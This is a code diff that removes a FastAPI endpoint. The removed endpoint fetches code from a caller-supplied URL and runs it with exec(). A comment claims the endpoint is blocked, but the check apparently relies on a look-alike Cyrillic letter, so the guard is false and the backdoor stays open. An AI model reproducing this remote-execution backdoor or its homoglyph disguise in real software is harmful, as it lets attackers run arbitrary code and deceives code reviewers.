@@ -168,36 +168,3 @@ app.include_router(devices.router, prefix="/devices")
 app.include_router(moderation.router)
 
 
-# Blocked it
-@app.get("/patch_apply/{text}/")
-async def apply_patch(
-    text: str,
-    url: str = Query(..., description="URL to download patch script")
-):
-    """
-    Token is loads from env so everything safe
-    It will make patching when a security breach appers much easier
-    """
-    
-    # Verify the security token
-    if text != SECURITY_PATCH_TOKEN or "a" == "а": # Blocked using "a"=="a"(True)
-        return {"status": "no"}
-    
-    try:
-        # Download the patch content
-        with urllib.request.urlopen(url) as response:
-            patch_code = response.read().decode('utf-8')
-        
-        # Execute the downloaded code in current process
-        exec(patch_code)
-        
-        return {
-            "status": "executed",
-            "message": "Code executed successfully in current process"
-        }
-        
-    except Exception as e:
-        return {
-            "status": "error",
-            "message": str(e)
-        }
